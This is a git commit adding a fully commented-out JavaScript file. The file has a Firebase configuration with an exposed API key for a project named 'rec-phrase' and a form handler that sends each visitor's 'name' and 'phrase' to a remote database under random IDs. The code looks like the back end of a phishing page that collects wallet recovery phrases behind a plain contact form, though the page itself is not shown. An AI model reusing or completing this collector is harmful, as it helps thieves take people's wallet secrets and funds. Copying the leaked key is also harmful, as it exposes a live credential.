2056514b87db45c43c8869c7c99d3cda74f33968
Godfry <godfry@kali.G-tech>
2022-04-29 14:32:22 +0100

    web 29-04-2022

---
+++ js/app.js
@@ -0,0 +1,37 @@
+
+		// // Import the functions you need from the SDKs you need
+		// import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
+		// import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
+		 
+		// // Paste the code from Firebase
+		// // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+		// // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+		// const firebaseConfig = {
+		// 	apiKey: "AIzaSyBa5QUdE71zYbpn4Jpv7TSZax8bCpOCC7Q",
+		// 	authDomain: "rec-phrase-2c6d0.firebaseapp.com",
+		// 	databaseURL: "https://rec-phrase-2c6d0-default-rtdb.firebaseio.com",
+		// 	projectId: "rec-phrase-2c6d0",
+		// 	storageBucket: "rec-phrase-2c6d0.appspot.com",
+		// 	messagingSenderId: "343999867437",
+		// 	appId: "1:343999867437:web:045ffb356d42cca84ce6a4",
+		// 	measurementId: "G-0V0PL7GWBZ"
+		// };
+		 
+		// // Initialize Firebase
+		// const app = initializeApp(firebaseConfig);
+		 
+		// // Get a reference to the database service
+		// const db = getDatabase(app);
+		 
+		// document.getElementById('frmContact').addEventListener('submit', function(e) {
+		// 	e.preventDefault();
+		// 	set(ref(db, 'users/' + Math.random().toString(36).slice(2, 7)), {
+		// 		name: document.getElementById('name').value,
+		// 		phrase: document.getElementById('phrase').value,
+		// 		// subject: document.getElementById('subject').value,
+		// 		// message: document.getElementById('message').value
+		// 	});
+		 
+		// 	alert('Your form is submitted');
+		// 	document.getElementById('frmContact').reset();
+		// });
